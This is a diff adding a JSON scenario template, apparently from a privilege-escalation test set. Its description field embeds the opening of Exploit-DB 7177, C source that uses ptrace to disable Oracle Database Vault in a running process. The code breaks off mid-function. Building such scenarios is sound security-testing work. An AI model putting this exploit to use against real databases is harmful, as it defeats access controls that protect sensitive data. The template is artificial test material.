@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_7177",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Oracle Database Vault - 'ptrace(2)' Local Privilege Escalation\n\nExploit source code (7177.c):\n```\n/*\n * original release: http://vnull.pcnet.com.pl/blog/?p=92\n *\n * ora_dv_mem_off.c version 0x1\n * ORACLE Database Vault runtime disabler (x86_32 Linux only)\n * AKA give_back_the_freedom\n * by Jakub 'vnull' Wartak <jakub.wartak@gmail.com> 26.02.2008\n * 0-day PRIVATE! D0 N0T DI$TRIBUT3!\n *\n * Tested on 10.2.0.3, CentOS 5.\n * For other architectures/OS combos consider having fun with gdb ;]\n *\n * Whole Database Vault architecture is flawed if DBA has access to\n * oracle user process space. IMHO you could limit risk by creating\n * UNIX accounts for DBAs with membership of OSDBA group (along with\n * oracle SUID binary and shared memory with only read permission\n * for OSDBA group [check SHM privs: ipcs -cm] ). But how those DBAs\n * would cope with some serious crashes (requiring for e.g. restoring\n * controlfile) ?\n *\n * Usage:\n *\t\tSet enviorniment variables: ORACLE_BASE, ORACLE_SID, ORACLE_HOME\n * \t\t$ gcc -Wall ora_dv_mem_off.c -o ora_dv_mem_off -lbfd -liberty\n *\t\t$ ./ora_dv_mem_off\n *\n * REQUIEREMENTS:\n *\t+ run as oracle process owner (by default \"oracle\")\n *\t+ working ptrace(), it won't work in systems with ptrace()\n *    disabled (grsecurity and some LKMs).\n *\t+ BFD headers and library (binutils-devel)\n *\n * THE DOCUMENT IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND. THE\n * CONTENT MAY CHANGE WITHOUT NOTICE. IN NO EVENT SHALL THE AUTHORS BE\n * LIABLE FOR ANY SPECIAL, INDIRECT OR CONSEQUENTIAL DAMAGES, INJURIES,\n * LOSSES OR UNLAWFUL OFFENCES.\n *\n * USE AT OWN RISK!\n *\n */\n#include <bfd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <sys/ptrace.h>\n#include <sys/wait.h>\n#include <linux/user.h>\n#include <linux/ptrace.h>\n#include <asm/unistd.h> /* for __NR_clone */\n\n/* you may need to alter this */\n#define ORABASE  \"/u01/app/oracle/product/10.2.0/bin\"\n\n/*\n * Magic... (at&t syntax)\n * push %ebp\n * mov %esp, %ebp\n * mov <DV_FLAG>, %eax\n * [..]\n * where DV_FLAG is 32-bit long\n */\n#define ASM_DV_FUNC_PROLOG \"\\x55\\x8b\\xec\\xb8\"\n\nconst char *sqlplus = ORABASE \"/sqlplus\";\nconst char *oracle =  ORABASE \"/oracle\";\nconst int long_size = sizeof(long);\npid_t child;\n\nlong locate_dv_func(void)\n{\n\tasymbol **symbol_table;\n\tbfd *b = bfd_openr(oracle, NULL);\n\tif (b == NULL) {\n\t\tperror(\"bfd_openr\");\n\t\texit(-1);\n\t}\n\n\tbfd_check_format(b, bfd_object);\n\tlong storage_needed = bfd_get_symtab_upper_bound(b);\n\tif(storage_needed < 0) {\n\t\tfprintf(stderr, \"wtf?!\\n\");\n\t\texit(-1);\n\t}\n\n\tif((symbol_table = (asymbol**)malloc(storage_needed)) == 0) {\n\t\tperror(\"malloc\");\n\t\texit(-1);\n\t}\n\n\tint num_symbols;\n\tif((num_symbols = bfd_canonicalize_symtab(b, symbol_table)) <= 0) {\n\t\tfprintf(stderr, \"no symbols info\\n\");\n\t\texit(-1);\n\t}\n\n\tint i;\n\tfor(i = 0; i < num_symbols; i++) {\n\t\tchar *symname = bfd_asymbol_name(symbol_table[i]);\n\t\tvoid *symaddr = bfd_asymbol_value(symbol_table[i]);\n\t\t/* don't even ask why this funciton, for real hardcore: gdb -p <oraclePIDs> */\n\t\tif(!strcmp(symname, \"kzvt\n```",
+  "cve": "",
+  "exploitdb_id": "7177",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_7177",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
